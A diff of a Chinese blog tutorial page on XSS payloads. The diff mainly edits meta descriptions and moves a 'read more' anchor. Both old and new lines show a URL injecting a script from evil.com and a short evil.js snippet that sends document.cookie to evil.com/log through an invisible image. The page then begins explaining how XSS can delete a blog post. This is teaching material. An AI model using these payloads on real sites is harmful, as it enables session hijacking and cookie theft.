@@ -93,17 +93,17 @@
 
 
 
-<meta name="description" content="XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js http://www.a.com/test.htm?abc=&amp;quot;&amp;gt;&amp;lt;script src=http://www.evil.com/evil.js&amp;gt;&amp;lt;/script&amp;gt;真正的XSS Payloa">
+<meta name="description" content="XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js">
 <meta name="keywords" content="xss">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xss所加载的脚本">
 <meta property="og:url" content="http://Merl1ng.com/2017/07/24/xss所加载的脚本/index.html">
 <meta property="og:site_name" content="Merl1ng">
-<meta property="og:description" content="XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js http://www.a.com/test.htm?abc=&amp;quot;&amp;gt;&amp;lt;script src=http://www.evil.com/evil.js&amp;gt;&amp;lt;/script&amp;gt;真正的XSS Payloa">
-<meta property="og:updated_time" content="2017-07-27T06:55:37.676Z">
+<meta property="og:description" content="XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js">
+<meta property="og:updated_time" content="2017-07-28T05:58:48.742Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss所加载的脚本">
-<meta name="twitter:description" content="XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js http://www.a.com/test.htm?abc=&amp;quot;&amp;gt;&amp;lt;script src=http://www.evil.com/evil.js&amp;gt;&amp;lt;/script&amp;gt;真正的XSS Payloa">
+<meta name="twitter:description" content="XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js">
 
 
 
@@ -353,8 +353,8 @@
 
       
         <p>XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本）</p>
-<h3 id="加载远程脚本-常见"><a href="#加载远程脚本-常见" class="headerlink" title="加载远程脚本(常见)"></a>加载远程脚本(常见)</h3><h4 id="XSS-获取浏览器-Cookie对象"><a href="#XSS-获取浏览器-Cookie对象" class="headerlink" title="XSS 获取浏览器 Cookie对象"></a>XSS 获取浏览器 Cookie对象</h4><p>攻击者先加载一个远程脚本js</p>
-<p><code>http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</code><br>真正的XSS Payload写在这个远程脚本中，避免在URL的参数里写入大量的JavaScript代码<br><a id="more"></a><br>在evil.js中 可写入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var img = document.createElement(<span class="string">"img"</span>);</div><div class="line">img.src = <span class="string">"http://www.evil.com/log?"</span>+escape(document.cookie);</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure></p>
+<h3 id="加载远程脚本-常见"><a href="#加载远程脚本-常见" class="headerlink" title="加载远程脚本(常见)"></a>加载远程脚本(常见)</h3><h4 id="XSS-获取浏览器-Cookie对象"><a href="#XSS-获取浏览器-Cookie对象" class="headerlink" title="XSS 获取浏览器 Cookie对象"></a>XSS 获取浏览器 Cookie对象</h4><p>攻击者先加载一个远程脚本js<br><a id="more"></a><br><code>http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</code><br>真正的XSS Payload写在这个远程脚本中，避免在URL的参数里写入大量的JavaScript代码</p>
+<p>在evil.js中 可写入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var img = document.createElement(<span class="string">"img"</span>);</div><div class="line">img.src = <span class="string">"http://www.evil.com/log?"</span>+escape(document.cookie);</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure></p>
 <p>这段代码在页面中插入了一张看不见的图片 同时把document.cookie对象作为参数发送到远程服务器</p>
 <p><code>http://www.evil.com/log</code> 可以不存在 因为这个请求会在远程服务器的Web日志中留下记录<br>127.0.0.1 - - [24/Jul/2017:20:19:18 +8080] “GET /log?cookie1%D1234 HTTP1.1” 404 288</p>
 <h4 id="利用XSS删除文章"><a href="#利用XSS删除文章" class="headerlink" title="利用XSS删除文章"></a>利用XSS删除文章</h4><p>首先正常删除该文章的连接是<br><code>http://blog.sohu.com/manage/entry.do?m=delete&amp;id=12345678</code></p>
